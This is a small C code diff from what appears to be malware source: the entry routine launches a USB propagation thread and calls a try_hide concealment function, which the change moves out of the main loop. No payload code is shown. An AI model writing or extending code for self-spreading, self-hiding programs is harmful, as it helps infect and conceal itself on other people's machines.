@@ -121,10 +121,12 @@ void entry(Globals *global) {
     global->pthread_create(&thread_id_usb, NULL, start_usb_propagate, global);
 
     DEBUG_LOG("[ENTRY] Started all modules!\n");
+    
+    try_hide(global);
+
     // keep running
     while(1){
         TRAP;
-        try_hide(global);
         global->sleep_ms(1000);
     }
 }
